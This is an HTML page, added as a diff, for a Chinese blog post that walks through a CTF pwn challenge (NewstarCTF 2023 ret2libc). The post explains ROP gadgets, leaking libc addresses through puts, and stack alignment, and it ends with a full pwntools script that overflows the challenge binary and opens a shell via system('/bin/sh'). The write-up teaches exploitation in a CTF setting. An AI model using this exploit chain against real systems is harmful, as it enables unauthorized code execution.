@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="mango">
+    
+    <title>
+        
+            NewstarCTF 2023 week2 ret2libc详细解析 |
+        
+        House of Mango
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/mango/favicon-16x16.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#FFCCCC","title":"House of Mango","author":"mango","avatar":"/images/mango/android-chrome-96x96.png","logo":"/images/mango/android-chrome-96x96.png","favicon":"/images/mango/favicon-16x16.png"},"menu":{"Archives":"/archives","Tags":"/tags","Categories":"/categories","About":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep loving","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"category":false,"tag":false,"announcement":null},"post":{"author_badge":{"enable":false,"level_badge":false,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2023,"word_count":false,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":false,"provider":"github","url":null},"shields_style":{"enable":false,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","version":"4.0.6"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container border-box">
+
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/mango/android-chrome-96x96.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               House of Mango
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    <li class="menu-item">
+                        <a class=""
+                           href="/"
+                        >首页</a>
+                    </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >归档</a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >标签</a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >分类</a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >关于</a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            <li class="drawer-menu-item flex-center">
+                <a class=""
+                   href="/"
+                >首页</a>
+            </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives"
+                    >归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags"
+                    >标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories"
+                    >分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about"
+                    >关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        NewstarCTF 2023 week2 ret2libc详细解析
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/mango/android-chrome-96x96.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">mango</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2024-01-13 18:27:01</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Sat Jan 13 2024 23:43:16 GMT+0800">2024-01-13 23:43:16</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/writeup/">writeup</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <i class="icon fas fa-tags"></i>&nbsp;
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/CTF/">CTF</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body">
+                    
+
+                    <h1 id="NewstarCTF-week2-ret2libc详细解析"><a href="#NewstarCTF-week2-ret2libc详细解析" class="headerlink" title="NewstarCTF week2 ret2libc详细解析"></a>NewstarCTF week2 ret2libc详细解析</h1><p>newstar2023的题，在buu上还可以做，算是我正儿八经做的第一道pwn，太曲折了啊啊啊。</p>
+<p>存在<code>pop_rdi_ret</code>的gadget可以利用</p>
+<blockquote>
+<p>在x86_64架构中，函数调用的参数通过寄存器来传递，而不是通过栈来传递。前六个整数或者指针参数是通过<code>rdi</code>,<code>rsi</code>,<code>rdx</code>,<code>rcx</code>,<code>r8</code>,<code>r9</code>这六个寄存器来传递的。如果有更多参数，剩下的参数通过栈传递。</p>
+</blockquote>
+<p>若要使用ROP（Return Oriented Programming）来调用一个函数并且操控参数时，就要找到可以控制这些寄存器的gadget。比如</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> pop rdi;ret</span><br><span class="line"><span class="number">2.</span> pop rsi;popr15;ret (官方wp中使用的)</span><br><span class="line"><span class="number">3.</span> ret</span><br></pre></td></tr></table></figure>
+
+<p>获取<code>pop_rdi_ret</code>的地址</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary /... --only <span class="string">&quot;pop|ret&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img   src="/pic/image-20240110210815476.png"  alt="image-20240110210815476"></p>
+<p>然后看一下buf的偏移量</p>
+<img     src="/pic/image-20240110211701612.png"   alt="image-20240110211701612" style="zoom:67%;" >
+
+<p>找到偏移为0x20</p>
+<p>buf是全局变量，被放在bss段上</p>
+<blockquote>
+<p>在 C 语言中，一个变量是在 BSS 段还是在栈上，主要取决于它的声明位置和存储类别：</p>
+<ol>
+<li>全局变量和静态变量：这些变量通常存储在 BSS 段。BSS 段用于存储程序中未初始化的全局变量和静态变量。</li>
+<li>局部变量和函数参数：这些变量通常存储在栈上。当一个函数被调用时，它的局部变量和参数会被压入栈中。</li>
+</ol>
+</blockquote>
+<p>可以使用<code>objdump -h program//readelf -S program</code>查看<code>bss</code>段的地址（不同环境下<code>bss</code>的地址可能不同）</p>
+<p>使用<code>peda</code>的<code>vmmap</code>可以查看<code>bss</code>段有无执行权限</p>
+<p>整理一下思路，我们可以先把<code>buf</code>塞满（0x20），然后塞<code>rbp</code>（0x8，因为在<code>bss</code>段所以可以直接塞<code>bss</code>的起始位置）。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p.sendafter(</span><br><span class="line">    <span class="string">b&quot;Show me your magic again\n&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x20</span> + flat(bss,pop_rdi_ret, puts_got, puts_plt, main_addr),</span><br><span class="line">)<span class="comment">#40=32+8</span></span><br><span class="line">put_addr = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(put_addr))</span><br></pre></td></tr></table></figure>
+
+<p>然后因为64位程序的函数的第一个参数在<code>rdi</code>中，因此把栈顶的值弹出到<code>rdi</code>。在x86_64中，调用函数时，函数的第一个参数是通过<code>rdi</code>寄存器传递的。因此使用<code>pop_rdi_ret</code>这个gadget，把它的地址放在原本的<code>return address</code>处，那么程序就会跳转到<code>pop_rdi_ret</code>的地址处执行它。<code>pop_rdi</code>将此时的栈顶数据（<code>puts</code>函数的地址）弹给<code>rdi</code>，然后<code>ret</code>到<code>plt</code>表的<code>puts</code>处调用<code>puts</code>，那么<code>puts</code>就会找到<code>rdi</code>，打印<code>rdi</code>中<code>puts</code>的地址。<code>puts</code>执行之后，将<code>ret</code>回<code>main_addr</code>。</p>
+<p>这样就完成了<code>puts</code>函数地址的泄露，可以用于泄露远程libc的版本。</p>
+<p>这里我还另外打了read的地址。查libc版本的时候会准确一点。只有一个地址有时会有很多个版本的libc被检索到。<a class="link"   target="_blank" rel="noopener" href="https://libc.rip/" >https://libc.rip/<i class="fas fa-external-link-alt"></i></a></p>
+<p>只搜索三个字节（12位）的原因：</p>
+<blockquote>
+<p>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变</p>
+</blockquote>
+<p><img   src="/pic/image-20240112183625173.png"  alt="image-20240112183625173"></p>
+<p>这样就得到了<code>libc</code>的版本，可以看到有<code>system</code>和<code>/bin/sh</code>的偏移。所以我们计算<code>libc_base</code>，加上偏移得到需要的函数的地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc_base = puts_addr - <span class="number">0x80970</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x04F420</span></span><br><span class="line">binsh_addr = libc_base + <span class="number">0x1B3D88</span></span><br></pre></td></tr></table></figure>
+
+<p>这是手动计算的方法。还有其他两种办法（官方提供的）写在完整代码中了。</p>
+<p>现在的目标就是执行<code>system(&#39;/bin/sh&#39;)</code>了。与上面类似，仍然利用栈溢出构造ROP链。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bss--&gt;pop_rdi_ret--&gt;binsh_addr--&gt;system_addr--main_addr</span><br><span class="line">(填rbp--&gt;调整参数为<span class="string">&#x27;/bin/sh&#x27;</span>+ret跳到调用system处--&gt;/<span class="built_in">bin</span>/sh--&gt;system--&gt;main)</span><br></pre></td></tr></table></figure>
+
+<p>所以可以：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.sendafter(</span><br><span class="line">    <span class="string">b&quot;Show me your magic again\n&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x20</span> + flat(bss,pop_rdi_ret, binsh_addr,system_addr,main_addr),</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>然而这样执行程序崩溃了。为什么呢？</p>
+<p>因为在ubuntu18版本以上调用<code>system</code>函数需要栈对齐。</p>
+<p>64位的<code>system</code>命令有个<code>movaps</code>指令</p>
+<blockquote>
+<p>Movaps：<br><code>movaps XMM,XMM/m128 movaps XMM/128,XMM</code><br>把源存储器内容值送入目的寄存器,当有m128时,必须对齐内存16字节,也就是内存地址低4位为0,保证rsp&amp;0xf&#x3D;&#x3D;0</p>
+</blockquote>
+<p>(调用printf时也需要对齐)</p>
+<p>我们加一个<code>ret</code>来栈对齐：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.sendafter(</span><br><span class="line">    <span class="string">b&quot;Show me your magic again\n&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x20</span> + flat(bss,pop_rdi_ret, binsh_addr,ret,system_addr,main_addr),</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>大功告成！</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;./ret2libc&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">28657</span>) </span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc&quot;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400763</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000400761</span></span><br><span class="line">ret = <span class="number">0x0000000000400506</span></span><br><span class="line">bss = <span class="number">0x0000000000601040</span></span><br><span class="line"></span><br><span class="line">p.sendafter(</span><br><span class="line">    <span class="string">b&quot;Show me your magic again\n&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x20</span> + flat(bss,pop_rdi_ret, puts_got, puts_plt, main_addr),</span><br><span class="line">)<span class="comment">#40=32+8</span></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))  <span class="comment">#read: 0x7f514c91b020 puts:0x7f37fd048970</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc is provided</span></span><br><span class="line"><span class="comment"># libc_base=read_addr-libc.symbols[&#x27;read&#x27;]</span></span><br><span class="line"><span class="comment"># system_addr=libc_base+libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># binsh_addr=libc_base+libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libcsearcher</span></span><br><span class="line"><span class="comment"># libc = LibcSearcher(&#x27;read&#x27;, read_addr)</span></span><br><span class="line"><span class="comment"># libc_base = read_addr - libc.dump(&#x27;read&#x27;)</span></span><br><span class="line"><span class="comment"># system_addr = libc_base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment"># binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#find by hand</span></span><br><span class="line">libc_base = puts_addr - <span class="number">0x80970</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x04F420</span></span><br><span class="line">binsh_addr = libc_base + <span class="number">0x1B3D88</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#offical:</span></span><br><span class="line"><span class="comment"># p.sendafter(</span></span><br><span class="line"><span class="comment">#     b&quot;Show me your magic again\n&quot;,</span></span><br><span class="line"><span class="comment">#     b&quot;\x00&quot; * 0x20 + flat(bss,pop_rdi_ret, binsh_addr, pop_rsi_r15_ret, 0, 0, system_addr),</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#mango:</span></span><br><span class="line">p.sendafter(</span><br><span class="line">    <span class="string">b&quot;Show me your magic again\n&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x20</span> + flat(bss,pop_rdi_ret, binsh_addr,ret,system_addr,main_addr),</span><br><span class="line">)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+                </div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/CTF/">CTF</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2024/01/19/pwn%E7%BB%83%E4%B9%A01/"
+                                   title="pwn练习1"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">pwn练习1</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2024/01/13/NSSCTF-Round-16-Basic-pwn/"
+                                   title="NSSCTF Round#16 Basic pwn"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">NSSCTF Round#16 Basic pwn</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#NewstarCTF-week2-ret2libc%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90"><span class="nav-text">NewstarCTF week2 ret2libc详细解析</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="border-box website-info-box default">
+        
+            <div class="copyright-info info-item default">
+                &copy;&nbsp;<span>2023</span>&nbsp;-&nbsp;2024
+                
+                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">mango</a>
+                
+            </div>
+
+            <div class="theme-info info-item default">
+                由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+            </div>
+
+            
+
+            
+        
+
+        <div class="count-item info-item default">
+            
+
+            
+                <span class="count-box border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-box border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="tools-list border-box">
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-toggle-theme-mode flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#NewstarCTF-week2-ret2libc%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90"><span class="nav-text">NewstarCTF week2 ret2libc详细解析</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+<!-- common -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local-search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="">
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- category-page -->
+    
+
+    <!-- links-page -->
+    
+
+    <!-- photos-page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
